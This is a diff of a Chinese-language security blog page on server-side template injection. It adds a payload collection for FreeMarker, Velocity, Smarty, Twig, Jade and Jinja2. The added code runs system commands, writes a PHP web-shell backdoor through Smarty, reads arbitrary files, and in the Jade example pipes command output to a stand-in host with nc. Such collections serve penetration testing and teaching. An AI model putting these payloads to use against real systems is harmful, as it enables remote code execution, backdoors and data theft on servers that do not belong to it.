@@ -17,8 +17,9 @@
 <meta property="og:description" content="0x01:简介">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://yoursite.com/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/2.jpeg">
 <meta property="article:published_time" content="2020-02-12T08:28:20.000Z">
-<meta property="article:modified_time" content="2020-03-12T01:03:33.876Z">
+<meta property="article:modified_time" content="2020-03-12T01:24:17.533Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="模板注入">
 <meta name="twitter:card" content="summary">
@@ -221,7 +222,37 @@
 <p><strong>NodeJS</strong>：Jade等</p>
 <h4 id="0x03：注入手法（ps-这是一张找来的图片）"><a href="#0x03：注入手法（ps-这是一张找来的图片）" class="headerlink" title="0x03：注入手法（ps:这是一张找来的图片）"></a>0x03：注入手法（ps:这是一张找来的图片）</h4><p> 对于模板注入漏洞的研究可以参考SQL注入，客户端的模板注入（CSTI）只能XSS，而服务端模板注入（SSTI）则可能造成XSS、LFI和任意代码执行。</p>
 <p> 漏洞发现及利用步骤分为：探测、判断、利用（读取、探索、攻击）</p>
-<p><img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.jpg" class="" title="examplename}&lt;&#x2F;p&gt; &lt;h4 id&#x3D;0x04：判断漏洞&gt;&lt;a href&#x3D;#0x04：判断漏洞 class&#x3D;headerlink title&#x3D;0x04：判断漏洞&gt;&lt;&#x2F;a&gt;0x04：判断漏洞&lt;&#x2F;h4&gt;&lt;p&gt;{%asset_img 2.jpeg examplename}&lt;&#x2F;p&gt; &lt;p&gt;通过图片中的payload可以快速判断&lt;&#x2F;p&gt;">
+<img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.jpg" class="" title="examplename">
+
+
+
+<h4 id="0x04：判断漏洞"><a href="#0x04：判断漏洞" class="headerlink" title="0x04：判断漏洞"></a>0x04：判断漏洞</h4><img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/2.jpeg" class="" title="examplename">
+
+<p>通过图片中的payload可以快速判断</p>
+<p>绿线表示成功，红线失败。49会在 Twig 中返回49，而在 Jinja2 中则是7777777</p>
+<h4 id="1x01：收集到的一些模板注入payload-具体的模板可以自行百度了解"><a href="#1x01：收集到的一些模板注入payload-具体的模板可以自行百度了解" class="headerlink" title="1x01：收集到的一些模板注入payload,具体的模板可以自行百度了解"></a>1x01：收集到的一些模板注入payload,具体的模板可以自行百度了解</h4><p>FreeMaker：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br><span class="line">return:uid&#x3D;119(tomcat7) gid&#x3D;127(tomcat7) groups&#x3D;127(tomcat7)</span><br></pre></td></tr></table></figure>
+
+<p>Velocity:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set($str&#x3D;$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line">#set($chr&#x3D;$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line">#set($ex&#x3D;$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out&#x3D;$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br><span class="line">&#x2F;&#x2F;输出 tomcat7</span><br></pre></td></tr></table></figure>
+
+<p>Smarty:</p>
+<p>1)写文件创建后门:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2)任意读取文件:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;loginuid&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Twig:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;返回结果： uid&#x3D;1000(k) gid&#x3D;1000(k) groups&#x3D;1000(k),10(wheel)</span><br></pre></td></tr></table></figure>
+
+<p>jade:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var x &#x3D; root.process</span><br><span class="line">x &#x3D; x.mainModule.require</span><br><span class="line">x &#x3D; x(&#39;child_process&#39;)</span><br><span class="line">x.exec(&#39;id | nc attacker.net 80&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>python模板注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;         &#x2F;&#x2F;遍历基类 找到eval函数</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;    &#x2F;&#x2F;找到了</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;) &#125;&#125;  &#x2F;&#x2F;导入cmd 执行popen里的命令 read读出数据</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
       
     </div>
     
